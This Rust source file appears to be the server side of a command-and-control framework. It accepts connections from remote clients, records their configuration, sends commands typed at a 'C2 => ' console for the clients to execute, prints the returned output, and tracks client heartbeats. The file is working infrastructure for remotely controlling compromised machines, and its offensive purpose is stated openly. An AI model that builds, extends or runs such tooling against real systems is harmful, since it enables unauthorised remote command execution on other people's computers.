use std::io::{self, BufRead, BufReader, Write};
use std::net::TcpStream;
use std::time::Instant;

use crate::config::{ClientConfig, ClientDetails, ClientManager, ClientCommand};
use crate::handler::command::{send_command, command_output, commands};

//
// pub fn send_command(mut stream: &TcpStream, cmd: &String) -> io::Result<()> {
//    let client_command = ClientCommand::new(cmd);
//
//    let serialized_command = ClientCommand::to_json(&client_command).expect(
//        "Failed to serialize command") + "\n";
//
//     stream.write_all(serialized_command.as_bytes())?;
//     stream.flush()?;
//
//     Ok(())
// }

//pub fn command_output(reader: &mut BufReader<&TcpStream>)
//    -> Result<ClientCommand, Box<dyn Error>> {
//
//    let mut buffer = Vec::new();
//    match reader.read_until(b'\n', &mut buffer) {
//        Ok(bytes_read) => {
//            if bytes_read == 0 {
//                println!("Connection closed inside command_output");
//            }
//
//
//            match serde_json::from_slice::<ClientCommand>(&buffer) {
//                Ok(command_with_output) => Ok(command_with_output),
//                Err(e) => {
//                    println!("[E] Failed to deserialize command output: {}", e);
//                    Err(Box::new(e))
//                },
//            }
//        },
//        Err(e) => {
//            println!("[E] Failed to read from stream: {}", e);
//            Err(Box::new(e))
//        }
//    }
//}

/// Handles an individual client connection.
///
/// Upon receiving a connection, it first expects to receive an initial configuration from the client.
/// It then enters a loop where it waits for commands to execute on behalf of the client, sends these commands,
/// and handles their outputs. Commands and their outputs are managed via `ClientManager`.
///
/// # Parameters
///
/// * `stream`: The TCP stream associated with the connected client.
/// * `client_manager`: An instance of `ClientManager` to manage client details and commands.
pub fn handle_client(stream: TcpStream, client_manager: ClientManager){
    let ip = stream.peer_addr().unwrap().to_string();
    let mut buffer = Vec::new();
    let mut reader = BufReader::new(&stream);

    // Initial configuration reception
    if let Ok(_) = reader.read_until(b'\n', &mut buffer) {

        match serde_json::from_slice::<ClientConfig>(&buffer) {
            Ok(config) => {
                client_manager.add_client(ip.clone(), ClientDetails {
                    config,
                    command: None,
                    last_heartbeat: Instant::now(),
                });
            },
            Err(e) => println!("[E] Failed to deserialize Client Config from \
                               {}: {}", ip, e),
        }
    }

    // Command processing loop
    loop {
        buffer.clear();
        let cmd: Option<String> = client_manager.get_command(&ip);
        if cmd != None {
            let cmd = cmd.unwrap();
            println!("[I] Sending '{}' command to {}", cmd, ip);
            send_command(&stream, &cmd).unwrap();

            println!("[I] Wainting for the output of the command command '{}' \
                     sent to {}", cmd, ip);

            let command: ClientCommand = command_output(&mut reader).unwrap();
            println!("Command {} output:\n{}", cmd, command.output.unwrap());

            client_manager.reset_command(&ip).unwrap();
        }
    }
}

/// A server loop that continuously accepts commands from the console to manage clients.
///
/// Commands include listing clients, terminating the server session, and initiating shell sessions
/// with specific clients.
///
/// # Parameters
///
/// * `server_client_manager`: An instance of `ClientManager` used for client management.
pub fn server(server_client_manager: ClientManager) {
    let mut cmd = String::new();

    loop {
        println!("C2 => ");
        io::stdout().flush().unwrap();

        cmd.clear();
        io::stdin().read_line(&mut cmd).expect("Failed to read command");
        cmd = cmd.trim_end().to_owned();

        commands(&cmd, &server_client_manager);
    }
}

/// Monitors heartbeats from clients, removing those that have not sent a
/// heartbeat within a threshold.
///
/// This function runs in a loop, periodically checking for clients that have
/// not sent heartbeats within a predetermined time frame and removing them
/// from the client manager.
///
/// # Parameters
///
/// * `heartbeat_client_manager`: An instance of `ClientManager` used for
/// managing client heartbeats.
pub fn monitor_heartbeats(heartbeat_client_manager: ClientManager) {
    loop {
        let clients_to_remove = heartbeat_client_manager.check_heartbeats();
        for ip in clients_to_remove {
            heartbeat_client_manager.remove_client(&ip);
            println!("[I] Client {} removed due to missing heartbeats", ip);
        }
        std::thread::sleep(std::time::Duration::from_secs(60));
    }
}

/// Listens for heartbeat messages from a specific client.
///
/// This function continuously reads messages from a client's TCP stream,
/// updating the client's last
/// heartbeat timestamp on receipt of a heartbeat message. If the connection
/// is closed, it removes the client from the client manager.
///
/// # Parameters
///
/// * `stream`: The TCP stream associated with the client.
/// * `client_manager`: An instance of `ClientManager` used for managing client
/// heartbeats and removal.
pub fn listen_for_heartbeats(stream: TcpStream, client_manager: ClientManager){
    let ip = stream.peer_addr().unwrap().to_string();
    let mut reader = BufReader::new(&stream);

    loop {
        let mut buffer = Vec::new();
        match reader.read_until(b'\n', &mut buffer) {
            Ok(bytes) => {
                if bytes == 0 {
                    println!("[I] Connection closed by client: {}", ip);
                    client_manager.remove_client(&ip);
                    break;
                }

                let message = String::from_utf8_lossy(&buffer).trim().to_string();
                if message == "heartbeat" {
                    println!("[I] Heartbeat received from {}", ip);
                    client_manager.update_heartbeat(&ip);
                }
            },
            Err(e) => {
                println!("[E] Error reading from: {}: {}", ip, e);
            }
        }
    }
}

